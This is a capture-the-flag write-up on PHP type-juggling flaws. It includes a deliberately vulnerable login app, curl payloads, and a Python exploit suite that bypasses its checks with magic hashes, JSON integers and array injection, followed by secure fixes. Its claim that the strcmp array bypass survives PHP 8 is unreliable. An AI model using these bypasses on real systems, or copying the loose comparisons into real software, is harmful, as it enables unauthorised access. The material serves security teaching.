---
title: "Web - PHP Type Juggling"
description: "Exploiting PHP loose comparison and type juggling vulnerabilities to bypass authentication, defeat hash checks, and capture the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Extreme            |
| Points     | 500                |
| Flag       | `zemi{typ3_juggl1ng_byp4ss}` |

## Challenge Files

Download the challenge files to get started:

- [docker-compose.yml](/Website/challenges/web-type-juggling/docker-compose.yml)
- [flag.txt](/Website/challenges/web-type-juggling/flag.txt)
- [index.php](/Website/challenges/web-type-juggling/index.php)
- [README.md](/Website/challenges/web-type-juggling/README.md)

## Prerequisites

This challenge assumes you have completed:

- **Web - SQL Injection (Login Bypass)** — understanding authentication bypass techniques
- **Web - Command Injection** — crafting payloads that exploit server-side input handling
- **Web - IDOR** — manipulating request parameters to access unintended resources
- **Web - Insecure Deserialization** — understanding how type information in serialized data can be exploited

You should understand basic PHP syntax and be comfortable sending crafted HTTP requests with curl.

## Overview

PHP's type system is notoriously permissive. When comparing values with the loose comparison operator (`==`), PHP will silently convert ("juggle") types to make the comparison work. This behavior creates a class of vulnerabilities where an attacker can bypass authentication, hash comparisons, and access controls by sending values of unexpected types.

This challenge presents a PHP login application that uses loose comparison (`==`) to check passwords and hash values. By exploiting PHP's type juggling rules — particularly "magic hashes" and JSON type manipulation — we bypass authentication without knowing the actual credentials.

## How PHP Type Juggling Works

### Loose (==) vs Strict (===) Comparison

PHP has two comparison operators:

- `==` (loose): Converts types before comparing. `"0" == false` is `true`.
- `===` (strict): Compares value AND type. `"0" === false` is `false`.

The loose comparison rules are complex and counterintuitive:

```php
// These are all TRUE with loose comparison (==)
0 == "0"          // int vs string: string converted to int
0 == ""           // int vs string: empty string becomes 0
0 == "php"        // int vs string: non-numeric string becomes 0
"0" == false      // string vs bool: "0" is falsy
"" == false       // string vs bool: empty string is falsy
"" == null        // string vs null: empty string equals null
0 == null         // int vs null: 0 equals null
"0e123" == "0e456" // BOTH are treated as 0 in scientific notation

// These are all FALSE with strict comparison (===)
0 === "0"         // int is not string
0 === false       // int is not bool
"0e123" === "0e456" // different string values
```

The key vulnerability: when PHP compares a string that looks like scientific notation (e.g., `"0e12345"`) using `==`, it converts it to the number `0` (because `0 * 10^12345 = 0`).

### The Loose Comparison Table

Here is the PHP loose comparison truth table for common comparisons:

```
         | true  | false | 1    | 0    | -1   | "1"  | "0"  | ""   | null | "php"
---------|-------|-------|------|------|------|------|------|------|------|------
true     | TRUE  | false | TRUE | false| TRUE | TRUE | false| false| false| TRUE
false    | false | TRUE  | false| TRUE | false| false| TRUE | TRUE | TRUE | false
1        | TRUE  | false | TRUE | false| false| TRUE | false| false| false| false
0        | false | TRUE  | false| TRUE | false| false| TRUE | TRUE*| TRUE*| TRUE*
"1"      | TRUE  | false | TRUE | false| false| TRUE | false| false| false| false
"0"      | false | TRUE  | false| TRUE | false| false| TRUE | false| false| false
""       | false | TRUE  | false| TRUE*| false| false| false| TRUE | TRUE | false
null     | false | TRUE  | false| TRUE*| false| false| false| TRUE | TRUE | false
"php"    | TRUE  | false | false| TRUE*| false| false| false| false| false| TRUE
```

Notice: `0 == "php"` is `TRUE` (in PHP < 8.0). PHP tries to convert `"php"` to an integer, which yields `0`, so `0 == 0` is `true`. This was changed in PHP 8.0, but many applications still run older versions.

## Magic Hashes

A "magic hash" is a string whose MD5 (or SHA1) hash starts with `0e` followed by only digits. When PHP compares these hashes with `==`, it interprets them as scientific notation:

```php
$hash1 = "0e462097431906509019562988736854";  // MD5 of "240610708"
$hash2 = "0e830400451993494058024219903391";  // MD5 of "QNKCDZO"

// Loose comparison: both are 0 (0 * 10^462097... = 0)
var_dump($hash1 == $hash2);  // TRUE!

// Strict comparison: they are different strings
var_dump($hash1 === $hash2);  // FALSE
```

### Known Magic Hash Values

These strings produce MD5 hashes that start with `0e[0-9]+`:

| Input String | MD5 Hash |
|-------------|----------|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |
| `aabC9RqS` | `0e041022518165728065344349536617` |
| `0e215962017` | `0e291242476940776845150308577824` |
| `byGcY` | `0e591948146966052067035298880982` |

For SHA1:

| Input String | SHA1 Hash |
|-------------|-----------|
| `aaroZmOk` | `0e66507019969427134894567494305185566735` |
| `aaK1STfY` | `0e76658526655756207688271159624026011393` |
| `aaO8zKZF` | `0e89257456677279068558073954252716165668` |

## Setting Up the Challenge Locally

Save the following as `index.php`:

```php
<?php
// Flag
$FLAG = "zemi{typ3_juggl1ng_byp4ss}";

// Configuration
$ADMIN_PASSWORD_HASH = "0e462097431906509019562988736854"; // MD5 of "240610708"
$SECRET_TOKEN = "0e1234567890123456789012345678";          // Starts with 0e + digits
$API_KEY = 0; // Stored as integer 0

// Parse JSON input if Content-Type is application/json
$input = [];
$content_type = $_SERVER['CONTENT_TYPE'] ?? '';
if (strpos($content_type, 'application/json') !== false) {
    $input = json_decode(file_get_contents('php://input'), true) ?? [];
} else {
    $input = $_POST;
}

$action = $_GET['action'] ?? 'home';

switch ($action) {
    case 'home':
        echo "<h1>Zemi Auth Portal</h1>";
        echo "<p>Login: POST /index.php?action=login</p>";
        echo "<p>Verify: POST /index.php?action=verify</p>";
        echo "<p>Admin: POST /index.php?action=admin</p>";
        echo "<p>API: POST /index.php?action=api</p>";
        break;

    case 'login':
        // VULNERABLE: Loose comparison for password hash check
        $username = $input['username'] ?? '';
        $password = $input['password'] ?? '';

        if ($username !== 'admin') {
            http_response_code(401);
            echo json_encode(["error" => "Unknown user"]);
            break;
        }

        $password_hash = md5($password);

        // BUG: Using == instead of ===
        // If $password_hash starts with "0e" and contains only digits,
        // it equals the stored hash (which also starts with "0e")
        // because both are treated as 0 in scientific notation
        if ($password_hash == $ADMIN_PASSWORD_HASH) {
            echo json_encode([
                "message" => "Login successful!",
                "flag" => $FLAG,
                "note" => "You bypassed the hash check via type juggling"
            ]);
        } else {
            http_response_code(401);
            echo json_encode([
                "error" => "Invalid password",
                "debug_hash" => $password_hash
            ]);
        }
        break;

    case 'verify':
        // VULNERABLE: Loose comparison for token verification
        $token = $input['token'] ?? '';

        // BUG: Using == instead of ===
        // Sending integer 0 via JSON will match any "0e..." string
        if ($token == $SECRET_TOKEN) {
            echo json_encode([
                "message" => "Token verified!",
                "flag" => $FLAG
            ]);
        } else {
            http_response_code(401);
            echo json_encode(["error" => "Invalid token"]);
        }
        break;

    case 'admin':
        // VULNERABLE: strcmp with non-string input
        $password = $input['password'] ?? '';

        // BUG: strcmp() returns NULL (not 0) when given a non-string argument
        // NULL == 0 is TRUE with loose comparison
        if (strcmp($password, "sup3r_s3cr3t_p4ssw0rd") == 0) {
            echo json_encode([
                "message" => "Admin access granted!",
                "flag" => $FLAG
            ]);
        } else {
            http_response_code(401);
            echo json_encode(["error" => "Wrong password"]);
        }
        break;

    case 'api':
        // VULNERABLE: Integer comparison with loose typing
        $key = $input['api_key'] ?? '';

        // BUG: $API_KEY is integer 0
        // Any non-numeric string == 0 is TRUE in PHP < 8.0
        // Or sending integer 0 via JSON always matches
        if ($key == $API_KEY) {
            echo json_encode([
                "message" => "API access granted!",
                "flag" => $FLAG,
                "note" => "Integer 0 matches many strings with loose comparison"
            ]);
        } else {
            http_response_code(401);
            echo json_encode(["error" => "Invalid API key"]);
        }
        break;

    case 'array_bypass':
        // VULNERABLE: Array input bypasses string functions
        $search = $input['search'] ?? '';

        // BUG: preg_match() returns false (not 0) when given an array
        // false == 0 is TRUE with loose comparison
        if (preg_match('/^[a-zA-Z]+$/', $search) == 0) {
            http_response_code(400);
            echo json_encode(["error" => "Invalid characters in search"]);
        } else {
            // If the regex "matched" (or returned false due to array input),
            // the input is used unsafely
            echo json_encode([
                "message" => "Search accepted",
                "result" => "No results for: " . (is_array($search) ? "Array" : $search),
                "flag" => $FLAG
            ]);
        }
        break;

    default:
        echo json_encode(["error" => "Unknown action"]);
}
?>
```

Run with PHP's built-in server:

```bash
php -S 0.0.0.0:8080
```

The app runs at `http://localhost:8080`.

If you do not have PHP installed, you can use Docker:

```bash
docker run --rm -p 8080:8080 -v $(pwd):/app -w /app php:7.4-cli php -S 0.0.0.0:8080
```

## Reconnaissance

### Step 1: Explore the application

```bash
curl -s http://localhost:8080/index.php?action=home
```

```html
<h1>Zemi Auth Portal</h1>
<p>Login: POST /index.php?action=login</p>
<p>Verify: POST /index.php?action=verify</p>
<p>Admin: POST /index.php?action=admin</p>
<p>API: POST /index.php?action=api</p>
```

### Step 2: Try a normal login

```bash
curl -s -X POST "http://localhost:8080/index.php?action=login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword"}' | python3 -m json.tool
```

```json
{
    "error": "Invalid password",
    "debug_hash": "f1a4e55fd6e4be4880a06e2e846534ec"
}
```

The server shows us the MD5 hash of our input. The hash `f1a4e55fd6e4be4880a06e2e846534ec` does not start with `0e`, so it will not match. We need to find a password whose MD5 hash is a "magic hash."

## Exploitation

### Attack 1: Magic Hash Login Bypass

The server compares `md5($password) == $ADMIN_PASSWORD_HASH` where `$ADMIN_PASSWORD_HASH` is `"0e462097431906509019562988736854"`. With loose comparison, this equals `0`. We need a password whose MD5 also starts with `0e` followed by only digits.

Use one of the known magic hash inputs — `QNKCDZO` has MD5 `0e830400451993494058024219903391`:

```bash
curl -s -X POST "http://localhost:8080/index.php?action=login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"QNKCDZO"}' | python3 -m json.tool
```

```json
{
    "message": "Login successful!",
    "flag": "zemi{typ3_juggl1ng_byp4ss}",
    "note": "You bypassed the hash check via type juggling"
}
```

Flag captured: `zemi{typ3_juggl1ng_byp4ss}`

Why it works:

```
md5("QNKCDZO")              = "0e830400451993494058024219903391"
$ADMIN_PASSWORD_HASH         = "0e462097431906509019562988736854"

PHP interprets both as scientific notation:
  0e830400451993494058024219903391 = 0 * 10^830400... = 0
  0e462097431906509019562988736854 = 0 * 10^462097... = 0

0 == 0 → TRUE
```

### Attack 2: Token Verification Bypass via JSON Type

The verify endpoint compares `$token == $SECRET_TOKEN` where `$SECRET_TOKEN = "0e1234567890123456789012345678"`. With loose comparison, this string equals `0`.

If we send the JSON integer `0` instead of a string, it matches:

```bash
curl -s -X POST "http://localhost:8080/index.php?action=verify" \
  -H "Content-Type: application/json" \
  -d '{"token": 0}' | python3 -m json.tool
```

```json
{
    "message": "Token verified!",
    "flag": "zemi{typ3_juggl1ng_byp4ss}"
}
```

This works because JSON preserves types. When we send `0` (no quotes), PHP receives the integer `0`. Then `0 == "0e1234..."` is `true` because `"0e1234..."` is interpreted as `0` in scientific notation.

With a form POST, all values are strings, so we could not send a bare integer. JSON gives us type control.

### Attack 3: strcmp() Bypass with Array Injection

The admin endpoint uses `strcmp($password, "sup3r_s3cr3t_p4ssw0rd") == 0`. The `strcmp()` function is meant to compare two strings and return `0` if they are equal. But when given a non-string argument (like an array), `strcmp()` returns `NULL` and emits a warning.

With loose comparison: `NULL == 0` is `TRUE`.

```bash
curl -s -X POST "http://localhost:8080/index.php?action=admin" \
  -H "Content-Type: application/json" \
  -d '{"password": []}' | python3 -m json.tool
```

```json
{
    "message": "Admin access granted!",
    "flag": "zemi{typ3_juggl1ng_byp4ss}"
}
```

We sent an empty array `[]` instead of a string. PHP passed this array to `strcmp()`, which returned `NULL`. Then `NULL == 0` evaluated to `TRUE`, bypassing the password check entirely.

This also works with any array:

```bash
curl -s -X POST "http://localhost:8080/index.php?action=admin" \
  -H "Content-Type: application/json" \
  -d '{"password": ["anything", "here"]}' | python3 -m json.tool
```

### Attack 4: Integer 0 API Key Bypass

The API endpoint compares `$key == $API_KEY` where `$API_KEY = 0` (integer). On PHP < 8.0, any non-numeric string equals `0` with loose comparison:

```bash
# Send any non-numeric string
curl -s -X POST "http://localhost:8080/index.php?action=api" \
  -H "Content-Type: application/json" \
  -d '{"api_key": "anything"}' | python3 -m json.tool
```

```json
{
    "message": "API access granted!",
    "flag": "zemi{typ3_juggl1ng_byp4ss}",
    "note": "Integer 0 matches many strings with loose comparison"
}
```

On PHP 8.0+, non-numeric string comparisons with integers changed behavior. But sending the integer `0` directly via JSON still works on all versions:

```bash
curl -s -X POST "http://localhost:8080/index.php?action=api" \
  -H "Content-Type: application/json" \
  -d '{"api_key": 0}' | python3 -m json.tool
```

### Attack 5: Array Bypass of preg_match()

The array_bypass endpoint uses `preg_match()` to validate input. When `preg_match()` receives an array instead of a string, it returns `false` (not `0`). But `false == 0` is `TRUE` with loose comparison, so the check appears to pass:

```bash
curl -s -X POST "http://localhost:8080/index.php?action=array_bypass" \
  -H "Content-Type: application/json" \
  -d '{"search": ["<script>alert(1)</script>"]}' | python3 -m json.tool
```

```json
{
    "message": "Search accepted",
    "result": "No results for: Array",
    "flag": "zemi{typ3_juggl1ng_byp4ss}"
}
```

The regex validation was completely bypassed because we sent an array instead of a string.

### Complete Exploit Script

```python
#!/usr/bin/env python3
"""
PHP Type Juggling exploit suite for the Zemi Auth Portal challenge.
Demonstrates all type juggling bypass techniques.
"""

import requests
import hashlib
import json

BASE = "http://localhost:8080"

def try_login(username, password):
    """Attempt login with given credentials."""
    r = requests.post(
        f"{BASE}/index.php?action=login",
        json={"username": username, "password": password}
    )
    return r.json()

def try_verify(token):
    """Attempt token verification."""
    r = requests.post(
        f"{BASE}/index.php?action=verify",
        json={"token": token}
    )
    return r.json()

def try_admin(password):
    """Attempt admin access."""
    r = requests.post(
        f"{BASE}/index.php?action=admin",
        json={"password": password}
    )
    return r.json()

def try_api(key):
    """Attempt API access."""
    r = requests.post(
        f"{BASE}/index.php?action=api",
        json={"api_key": key}
    )
    return r.json()

def find_magic_hash(prefix="0e", algorithm="md5", max_attempts=10000000):
    """
    Brute-force search for a string whose hash is a magic hash.
    A magic hash matches the pattern 0e[0-9]+ (scientific notation = 0).
    """
    import itertools
    import string

    print(f"[*] Searching for magic {algorithm} hash (this may take a while)...")
    charset = string.ascii_letters + string.digits

    for length in range(4, 10):
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            if algorithm == "md5":
                h = hashlib.md5(candidate.encode()).hexdigest()
            elif algorithm == "sha1":
                h = hashlib.sha1(candidate.encode()).hexdigest()

            if h.startswith(prefix) and h[2:].isdigit():
                print(f"[!] Found: {candidate} -> {algorithm}({candidate}) = {h}")
                return candidate

    return None

# ============================================================
# Main exploit
# ============================================================

print("=" * 60)
print("  PHP Type Juggling Exploit Suite")
print("=" * 60)

# Attack 1: Magic hash login bypass
print("\n" + "-" * 40)
print("Attack 1: Magic Hash Login Bypass")
print("-" * 40)

known_magic = {
    "240610708": "0e462097431906509019562988736854",
    "QNKCDZO":  "0e830400451993494058024219903391",
    "aabg7XSs": "0e087386482136013740957780965295",
    "aabC9RqS": "0e041022518165728065344349536617",
    "byGcY":    "0e591948146966052067035298880982",
}

for password, expected_hash in known_magic.items():
    actual_hash = hashlib.md5(password.encode()).hexdigest()
    print(f"[*] Trying '{password}' (MD5: {actual_hash})")
    result = try_login("admin", password)
    if "flag" in result:
        print(f"[!] SUCCESS: {json.dumps(result, indent=2)}")
        break
    else:
        print(f"[-] Failed: {result.get('error')}")

# Attack 2: JSON integer bypass for token
print("\n" + "-" * 40)
print("Attack 2: Token Bypass via JSON Integer")
print("-" * 40)

print("[*] Sending token as integer 0...")
result = try_verify(0)
if "flag" in result:
    print(f"[!] SUCCESS: {json.dumps(result, indent=2)}")
else:
    print(f"[-] Failed: {result}")

print("[*] Sending token as string '0'...")
result = try_verify("0")
if "flag" in result:
    print(f"[!] SUCCESS: {json.dumps(result, indent=2)}")
else:
    print(f"[-] Failed (expected): string '0' != '0e1234...' as strings")

# Attack 3: strcmp() array bypass
print("\n" + "-" * 40)
print("Attack 3: strcmp() Array Bypass")
print("-" * 40)

print("[*] Sending password as empty array []...")
result = try_admin([])
if "flag" in result:
    print(f"[!] SUCCESS: {json.dumps(result, indent=2)}")
else:
    print(f"[-] Failed: {result}")

# Attack 4: Integer 0 API key bypass
print("\n" + "-" * 40)
print("Attack 4: Integer 0 API Key Bypass")
print("-" * 40)

print("[*] Sending api_key as integer 0...")
result = try_api(0)
if "flag" in result:
    print(f"[!] SUCCESS: {json.dumps(result, indent=2)}")
else:
    print(f"[-] Failed: {result}")

print("[*] Sending api_key as string 'anything'...")
result = try_api("anything")
if "flag" in result:
    print(f"[!] SUCCESS (PHP < 8.0): {json.dumps(result, indent=2)}")
else:
    print(f"[-] Failed (expected on PHP 8.0+): {result}")

print("\n" + "=" * 60)
print("  All attacks completed")
print("=" * 60)
```

Run:

```bash
python3 exploit.py
```

Expected output:

```
============================================================
  PHP Type Juggling Exploit Suite
============================================================

----------------------------------------
Attack 1: Magic Hash Login Bypass
----------------------------------------
[*] Trying '240610708' (MD5: 0e462097431906509019562988736854)
[!] SUCCESS: {
  "message": "Login successful!",
  "flag": "zemi{typ3_juggl1ng_byp4ss}",
  "note": "You bypassed the hash check via type juggling"
}

----------------------------------------
Attack 2: Token Bypass via JSON Integer
----------------------------------------
[*] Sending token as integer 0...
[!] SUCCESS: {
  "message": "Token verified!",
  "flag": "zemi{typ3_juggl1ng_byp4ss}"
}

----------------------------------------
Attack 3: strcmp() Array Bypass
----------------------------------------
[*] Sending password as empty array []...
[!] SUCCESS: {
  "message": "Admin access granted!",
  "flag": "zemi{typ3_juggl1ng_byp4ss}"
}

----------------------------------------
Attack 4: Integer 0 API Key Bypass
----------------------------------------
[*] Sending api_key as integer 0...
[!] SUCCESS: {
  "message": "API access granted!",
  "flag": "zemi{typ3_juggl1ng_byp4ss}",
  "note": "Integer 0 matches many strings with loose comparison"
}

============================================================
  All attacks completed
============================================================
```

### Finding Your Own Magic Hashes

If none of the known magic hashes work (perhaps the server uses SHA1 or a different algorithm), you can brute-force your own:

```python
#!/usr/bin/env python3
"""
Brute-force search for magic hashes.
A magic hash is a string whose hash matches: 0e[0-9]+
"""

import hashlib
import itertools
import string
import sys

def find_magic_hashes(algorithm="md5", charset=None, min_len=4, max_len=8):
    if charset is None:
        charset = string.ascii_letters + string.digits

    hash_func = hashlib.md5 if algorithm == "md5" else hashlib.sha1
    count = 0

    for length in range(min_len, max_len + 1):
        print(f"[*] Trying length {length}...")
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            h = hash_func(candidate.encode()).hexdigest()
            count += 1

            if h.startswith("0e") and h[2:].isdigit():
                print(f"\n[!] MAGIC HASH FOUND!")
                print(f"    Input:  {candidate}")
                print(f"    {algorithm.upper()}: {h}")
                print(f"    Attempts: {count}")
                return candidate

            if count % 1000000 == 0:
                print(f"    Checked {count} candidates...", end='\r')

    return None

if __name__ == "__main__":
    algo = sys.argv[1] if len(sys.argv) > 1 else "md5"
    print(f"[*] Searching for {algo.upper()} magic hash...")
    result = find_magic_hashes(algorithm=algo)
    if result:
        print(f"\n[+] Use this as your password: {result}")
    else:
        print("\n[-] No magic hash found in search space")
```

## The Fix

### Fix 1: Use strict comparison (===)

```php
<?php
// VULNERABLE: Loose comparison
if ($password_hash == $stored_hash) { /* ... */ }

// FIXED: Strict comparison
if ($password_hash === $stored_hash) { /* ... */ }
```

### Fix 2: Use hash_equals() for hash comparison

```php
<?php
// VULNERABLE: Loose comparison + timing attack
if (md5($password) == $stored_hash) { /* ... */ }

// FIXED: Constant-time comparison + strict types
if (hash_equals($stored_hash, md5($password))) { /* ... */ }
```

`hash_equals()` performs a constant-time string comparison, preventing both type juggling and timing attacks.

### Fix 3: Use password_hash() and password_verify()

```php
<?php
// STORING a password (during registration)
$hashed = password_hash($password, PASSWORD_BCRYPT);
// Store $hashed in the database

// VERIFYING a password (during login)
if (password_verify($input_password, $stored_hash)) {
    // Login success
}
```

`password_verify()` is type-safe and uses bcrypt, which is not susceptible to magic hash attacks.

### Fix 4: Type casting and validation

```php
<?php
// Force inputs to expected types
$token = (string) ($input['token'] ?? '');
$api_key = (string) ($input['api_key'] ?? '');
$password = (string) ($input['password'] ?? '');

// Validate types before comparison
if (!is_string($token)) {
    http_response_code(400);
    echo json_encode(["error" => "Token must be a string"]);
    exit;
}

// Use strict comparison after type validation
if ($token === $expected_token) { /* ... */ }
```

### Fix 5: Use PHP strict types

```php
<?php
declare(strict_types=1);

// With strict_types=1, PHP will throw a TypeError if function
// arguments do not match the declared type
function verifyToken(string $token): bool {
    $expected = "0e1234567890123456789012345678";
    return hash_equals($expected, $token);
}

// This will throw TypeError instead of silently type-juggling
verifyToken(0);    // TypeError!
verifyToken([]);   // TypeError!
```

### Complete fixed application

```php
<?php
declare(strict_types=1);

$FLAG = "zemi{typ3_juggl1ng_byp4ss}";

// Use proper password hashing (bcrypt)
$ADMIN_PASSWORD_HASH = password_hash("real_secret_password", PASSWORD_BCRYPT);
$SECRET_TOKEN = bin2hex(random_bytes(32)); // Random token, not 0e...
$API_KEY = bin2hex(random_bytes(16));      // String, not integer 0

$input = [];
$content_type = $_SERVER['CONTENT_TYPE'] ?? '';
if (strpos($content_type, 'application/json') !== false) {
    $input = json_decode(file_get_contents('php://input'), true) ?? [];
}

$action = $_GET['action'] ?? 'home';

switch ($action) {
    case 'login':
        $username = $input['username'] ?? '';
        $password = $input['password'] ?? '';

        // Type validation
        if (!is_string($username) || !is_string($password)) {
            http_response_code(400);
            echo json_encode(["error" => "Invalid input types"]);
            break;
        }

        if ($username !== 'admin') {
            http_response_code(401);
            echo json_encode(["error" => "Unknown user"]);
            break;
        }

        // FIXED: Use password_verify() — type-safe and timing-safe
        if (password_verify($password, $ADMIN_PASSWORD_HASH)) {
            echo json_encode(["message" => "Login successful!", "flag" => $FLAG]);
        } else {
            http_response_code(401);
            echo json_encode(["error" => "Invalid password"]);
        }
        break;

    case 'verify':
        $token = $input['token'] ?? '';

        // Type validation
        if (!is_string($token)) {
            http_response_code(400);
            echo json_encode(["error" => "Token must be a string"]);
            break;
        }

        // FIXED: hash_equals() — strict and constant-time
        if (hash_equals($SECRET_TOKEN, $token)) {
            echo json_encode(["message" => "Token verified!", "flag" => $FLAG]);
        } else {
            http_response_code(401);
            echo json_encode(["error" => "Invalid token"]);
        }
        break;

    case 'admin':
        $password = $input['password'] ?? '';

        // Type validation — reject non-string input
        if (!is_string($password)) {
            http_response_code(400);
            echo json_encode(["error" => "Password must be a string"]);
            break;
        }

        // FIXED: Strict comparison after type validation
        if (hash_equals("sup3r_s3cr3t_p4ssw0rd", $password)) {
            echo json_encode(["message" => "Admin access granted!", "flag" => $FLAG]);
        } else {
            http_response_code(401);
            echo json_encode(["error" => "Wrong password"]);
        }
        break;

    case 'api':
        $key = $input['api_key'] ?? '';

        // Type validation
        if (!is_string($key)) {
            http_response_code(400);
            echo json_encode(["error" => "API key must be a string"]);
            break;
        }

        // FIXED: String API key + hash_equals()
        if (hash_equals($API_KEY, $key)) {
            echo json_encode(["message" => "API access granted!", "flag" => $FLAG]);
        } else {
            http_response_code(401);
            echo json_encode(["error" => "Invalid API key"]);
        }
        break;
}
?>
```

## PHP 8.0 Changes

PHP 8.0 made significant changes to loose comparison behavior:

```php
// PHP 7.x: TRUE (non-numeric string converts to 0)
0 == "php"  // TRUE

// PHP 8.0+: FALSE (integer is compared as string)
0 == "php"  // FALSE
```

However, magic hash attacks still work on PHP 8.0+ because `"0e123..." == "0e456..."` is still `TRUE` — both strings are valid numeric strings and are compared as numbers. The fix is always to use `===` or `hash_equals()`.

| Comparison | PHP 7.x | PHP 8.0+ |
|-----------|---------|----------|
| `0 == "php"` | TRUE | **FALSE** |
| `0 == ""` | TRUE | **FALSE** |
| `0 == "0e123"` | TRUE | TRUE |
| `"0e123" == "0e456"` | TRUE | TRUE |
| `0 == null` | TRUE | TRUE |
| `"" == null` | TRUE | TRUE |

## Common Pitfalls

- **Only fixing `==` in login code** — type juggling bugs can exist anywhere: API key validation, CSRF token checks, HMAC comparison, coupon codes, invitation links, and more. Audit all comparisons.
- **Assuming PHP 8.0 fixes everything** — while PHP 8.0 fixed many loose comparison quirks, magic hashes and `strcmp()` bypass still work. Always use strict comparison.
- **Forgetting JSON type control** — form POST data is always strings, but JSON preserves types (integer, boolean, array, null). Attackers can send JSON to inject unexpected types even if the application was designed for form data.
- **Using `strcmp()` with `==`** — `strcmp()` returns `NULL` on error, and `NULL == 0` is `TRUE`. Always use `===` with `strcmp()`, or better yet, use `hash_equals()`.
- **Not validating input types** — always check `is_string()`, `is_int()`, etc. before using input in comparisons, even after the PHP 8.0 changes.
- **Storing hashes as integers** — if a hash looks like a number (`0e...`), PHP may store or compare it as an integer. Always treat hashes as strings.

## Tools Used

- **curl** — crafting JSON payloads with specific types (integers, arrays, null)
- **Python (requests)** — automating type juggling attacks across multiple endpoints
- **Python (hashlib)** — computing and brute-forcing magic hash values
- **PHP CLI** — testing loose comparison behavior locally with `php -r`
- **Burp Suite** — intercepting and modifying request Content-Type and body format

## Lessons Learned

- PHP's loose comparison operator (`==`) is a persistent source of security vulnerabilities — always use strict comparison (`===`) or type-safe functions like `hash_equals()` and `password_verify()`
- Magic hashes exploit the fact that PHP treats strings matching `0e[0-9]+` as scientific notation equal to zero — this bypasses hash comparisons when `==` is used
- JSON payloads give attackers type control that form data does not — they can send integers, booleans, arrays, and null to trigger unexpected behavior in PHP type comparisons
- The `strcmp()` function returns `NULL` on error (e.g., when given an array), and `NULL == 0` is `TRUE` — this is a common authentication bypass pattern
- PHP 8.0 improved loose comparison behavior but did not eliminate all type juggling risks — magic hashes and `strcmp()` bypass still work
- Defense requires multiple layers: strict comparison, input type validation, `declare(strict_types=1)`, and using purpose-built functions (`password_verify()`, `hash_equals()`) instead of raw comparison operators
- When auditing PHP applications, search for `==` comparisons involving user input, `strcmp()` with `==`, and any place where `md5()` or `sha1()` output is compared with `==`
